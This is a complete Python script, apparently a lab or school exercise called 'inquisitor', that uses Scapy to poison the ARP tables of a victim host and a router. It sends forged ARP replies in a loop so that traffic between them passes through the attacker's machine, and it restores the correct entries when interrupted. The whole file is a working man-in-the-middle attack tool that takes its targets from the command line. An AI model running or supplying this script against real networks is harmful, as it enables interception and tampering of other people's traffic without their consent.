#!/usr/bin/env python3

from scapy.all import ARP, sendp, get_if_hwaddr, Ether
import time
from sys import argv

def restore_arp():
    print("Restoring ARP tables...")
    correct_victim = Ether(dst=VICTIM_MAC) / ARP (
        op=2,
        pdst=VICTIM_IP,
        psrc=ROUTER_IP,
        hwdst=VICTIM_MAC,
        hwsrc=ROUTER_MAC
    )
    correct_router = Ether(dst=ROUTER_MAC) / ARP (
        op=2,
        pdst=ROUTER_IP,
        psrc=VICTIM_IP,
        hwdst=ROUTER_MAC,
        hwsrc=VICTIM_MAC
    )
    for i in range(1, 10):
        sendp(correct_router, verbose=False)
        sendp(correct_victim, verbose=False)
        time.sleep(0.5)
    print("ARP tables restored.")

def arp_poison():
    print("Poisoning ARP tables...")
    poison_victim = Ether(dst=VICTIM_MAC) / ARP(
        op=2,
        pdst=VICTIM_IP,
        psrc=ROUTER_IP,
        hwdst=VICTIM_MAC,
        hwsrc=ATTACKER_MAC
    )

    poison_router = Ether(dst=ROUTER_MAC) / ARP(
        op=2,
        pdst=ROUTER_IP,
        psrc=VICTIM_IP,
        hwdst=ROUTER_MAC,
        hwsrc=ATTACKER_MAC
    )
    try:
        while True:
            sendp(poison_victim, verbose=False)
            sendp(poison_router, verbose=False)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nStopping attack..")
        time.sleep(1)
        restore_arp()

if (len(argv) != 5):
    print("Usage: ./inquisitor <IP-src> <MAC-src> <IP-target> <MAC-target>")
    exit(1)

ROUTER_IP = argv[1]     # 172.20.0.3
ROUTER_MAC = argv[2]    # e2:38:cc:57:da:ec
VICTIM_IP = argv[3]     # 172.20.0.10
VICTIM_MAC = argv[4]    # 62:b6:ac:8f:57:be

ATTACKER_MAC = get_if_hwaddr("eth0")

arp_poison()





